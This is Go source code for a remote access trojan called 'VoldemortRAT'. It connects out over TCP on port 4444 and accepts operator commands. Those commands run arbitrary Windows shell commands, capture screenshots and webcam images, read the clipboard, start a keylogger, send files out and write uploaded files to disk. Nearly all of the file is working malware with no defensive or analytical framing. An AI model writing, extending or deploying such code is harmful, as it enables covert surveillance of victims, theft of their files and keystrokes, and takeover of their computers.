package main

import (
    "bufio"
    "encoding/base64"
    "fmt"
    "net"
    "os"
    "os/exec"
    "strings"

    "./clipboard"
    "./keylogger"
    "./screenshot"
    "./webcam"
)

func getLocalAttackerIP() string {
    conn, err := net.Dial("udp", "8.8.8.8:80")
    if err != nil {
        return "127.0.0.1"
    }
    defer conn.Close()
    localAddr := conn.LocalAddr().(*net.UDPAddr)
    return localAddr.IP.String()
}

var (
    LHOST = getLocalAttackerIP()
    LPORT = "4444"
)

func handleConnection(conn net.Conn) {
    defer conn.Close()
    reader := bufio.NewReader(conn)

    for {
        commandLine, err := reader.ReadString('\n')
        if err != nil {
            break
        }

        cmd := strings.TrimSpace(commandLine)

        switch {
        case cmd == "exit":
            conn.Write([]byte("[VoldemortRAT] Farewell, master.\n"))
            return

        case strings.HasPrefix(cmd, "cmd "):
            output := runShellCommand(strings.TrimPrefix(cmd, "cmd "))
            conn.Write([]byte(output))

        case cmd == "screenshot":
            filename := "screenshot.png"
            err := screenshot.CaptureAndSave(filename)
            if err != nil {
                conn.Write([]byte("[VoldemortRAT] Screenshot failed.\n"))
            } else {
                conn.Write([]byte("[STARTFILE]\n"))
                data, _ := os.ReadFile(filename)
                conn.Write(data)
                conn.Write([]byte("\n[ENDFILE]\n"))
            }

        case cmd == "webcam":
            filename := "webcam.jpg"
            err := webcam.CaptureSnapshot(filename)
            if err != nil {
                conn.Write([]byte("[VoldemortRAT] Webcam capture failed.\n"))
            } else {
                conn.Write([]byte("[STARTFILE]\n"))
                data, _ := os.ReadFile(filename)
                conn.Write(data)
                conn.Write([]byte("\n[ENDFILE]\n"))
            }

        case cmd == "clipboard":
            text := clipboard.ReadClipboard()
            conn.Write([]byte("[VoldemortRAT] Clipboard content: " + text + "\n"))

        case cmd == "keylog":
            conn.Write([]byte("[VoldemortRAT] Keylogging started. Press CTRL+C to stop.\n"))
            keylogger.StartLogging()

        case cmd == "systeminfo":
            output := runShellCommand("systeminfo")
            conn.Write([]byte(output))

        case strings.HasPrefix(cmd, "download "):
            filepath := strings.TrimPrefix(cmd, "download ")
            data, err := os.ReadFile(filepath)
            if err != nil {
                conn.Write([]byte("[!] Failed to read file.\n"))
            } else {
                conn.Write([]byte("[STARTFILE]\n"))
                conn.Write(data)
                conn.Write([]byte("\n[ENDFILE]\n"))
            }

        case strings.HasPrefix(cmd, "upload "):
            filepath := strings.TrimPrefix(cmd, "upload ")
            conn.Write([]byte("[VoldemortRAT] Send base64 file data:\n"))
            dataLine, _ := reader.ReadString('\n')
            decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(dataLine))
            if err != nil {
                conn.Write([]byte("[!] Base64 decoding failed.\n"))
            } else {
                err := os.WriteFile(filepath, decoded, 0644)
                if err != nil {
                    conn.Write([]byte("[!] File write failed.\n"))
                } else {
                    conn.Write([]byte("[+] File uploaded successfully.\n"))
                }
            }

        default:
            conn.Write([]byte("[VoldemortRAT] Unknown spell: " + cmd + "\n"))
        }
    }
}

func runShellCommand(cmd string) string {
    out, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
    if err != nil {
        return fmt.Sprintf("[!] Command error: %s\n", err)
    }
    return string(out)
}

func main() {
    conn, err := net.Dial("tcp", LHOST+":"+LPORT)
    if err != nil {
        return
    }
    handleConnection(conn)
}
